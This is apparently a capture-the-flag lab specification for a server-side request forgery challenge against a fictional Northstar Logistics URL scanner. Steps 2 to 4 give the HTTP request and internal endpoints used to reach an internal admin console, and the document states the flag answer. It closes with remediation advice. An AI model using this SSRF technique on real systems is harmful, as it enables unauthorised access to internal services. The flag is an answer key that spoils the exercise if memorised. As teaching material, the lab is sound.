# Challenge 3 - SSRF & Internal Service Discovery

## Purpose

Northstar Logistics operates a URL inspection service that fetches a user-supplied address server-side and returns the response. The learner investigates whether that server-side request boundary can be abused to reach an internal operations console that is not exposed to the attacker network.

The intended finding is a server-side request forgery (SSRF). The scanner does not restrict the destination of outbound requests, so the learner can drive it against `internal-admin.internal.lab`, enumerate the internal API, and retrieve the restricted flag document.

This challenge uses real HTTP requests handled by the scanner backend. Completion must never depend on recognizing a typed command or a frontend-only string.

## Scope

| Item | Value |
| --- | --- |
| Company | Northstar Logistics |
| Target | `http://scanner.internal.lab` |
| Lab network | `10.20.0.0/16` |
| Internal service | `internal-admin.internal.lab` |
| Primary vulnerability | Server-side request forgery (SSRF) |
| Flag | `RIVAN{ssrf_internal_network}` |

## Learning Objectives

- Recognize URL-fetching features as SSRF attack surface.
- Distinguish client-side from server-side request origin.
- Use an SSRF primitive to reach non-routable internal services.
- Enumerate an internal API through the vulnerable fetcher.
- Explain egress controls and destination allowlisting as remediation.

## Required Evidence

1. The URL-inspection feature is discovered on the scanner target.
2. Server-side request behavior is identified from responses.
3. The scanner is driven against the internal operations console.
4. The internal API is enumerated for interesting documents.
5. The restricted internal resource is retrieved.
6. The exact flag is submitted.

## Student Workflow

### Step 0 - Start or Reset the Lab

Open `/challenges/ssrf-internal-service-discovery` and select **Reset lab**. Reset clears challenge evidence, submitted flag state, and scanner history.

### Step 1 - Discover the URL-Fetching Feature

Open the scanner target (`/targets/scanner`) and submit any ordinary URL. The service returns a JSON envelope:

```json
{ "status": "ok", "fetchedUrl": "...", "upstreamStatus": 200, "response": "..." }
```

The `upstreamStatus` and `response` fields prove the server, not the browser, issued the request.

### Step 2 - Probe the Internal Boundary

Submit the internal operations console:

```http
POST /api/scan HTTP/1.1
Host: scanner.internal.lab
Content-Type: application/json

{"url":"http://internal-admin.internal.lab/api/status"}
```

The scanner accepts the internal destination and returns:

```json
{ "service": "internal-admin", "status": "operational", "hostname": "internal-admin.internal.lab" }
```

### Step 3 - Enumerate the Internal Service

Fetch the notes document referenced by the internal service:

```text
http://internal-admin.internal.lab/api/notes
```

The response discloses that the restricted objective store lives under `/api/flag`.

### Step 4 - Retrieve and Submit the Flag

Fetch the restricted document through the scanner:

```text
http://internal-admin.internal.lab/api/flag
```

The internal console returns `{ "flag": "RIVAN{ssrf_internal_network}" }`. Submit the exact value in the challenge workspace.

## Expected Evidence States

| Evidence | Trigger |
| --- | --- |
| Feature discovered | A request reaches `/api/scan` |
| Server-side behavior identified | Scanner response contains upstream fetch details |
| Internal service reached | Scan target resolves to `internal-admin.internal.lab` |
| Internal service enumerated | `/api/status` or `/api/notes` is retrieved through the scanner |
| Restricted information retrieved | `/api/flag` returns 200 through the scanner |
| Flag submitted | Server validates the exact flag |

## Reset Requirements

Reset must clear scanner history, challenge evidence, and submitted flag state. The internal-admin service is stateless and requires no reset.

## Instructor Notes

The internal console only trusts requests carrying the `x-rivan-internal: scanner.internal.lab` header, which the scanner adds to outbound fetches. Direct learner requests to the internal host receive `404 not found`; the SSRF through the scanner is the intended and only path. Do not leak the internal hostname in page source before the learner probes it.

## Remediation

**Vulnerability:** Server-side request forgery (SSRF).

**Attack surface:** The URL inspection feature's outbound fetcher.

**Impact:** Attackers reach internal services that trust the scanner's network position, read restricted documents, and map internal infrastructure.

**Root cause:** The fetcher accepts arbitrary destinations and attaches a privileged internal identity header to every request.

**Remediation:** Enforce a destination allowlist or resolve-and-validate DNS against private ranges before fetching, strip internal identity headers from user-driven requests, isolate metadata and admin planes, and log and alert on outbound requests to internal address space.
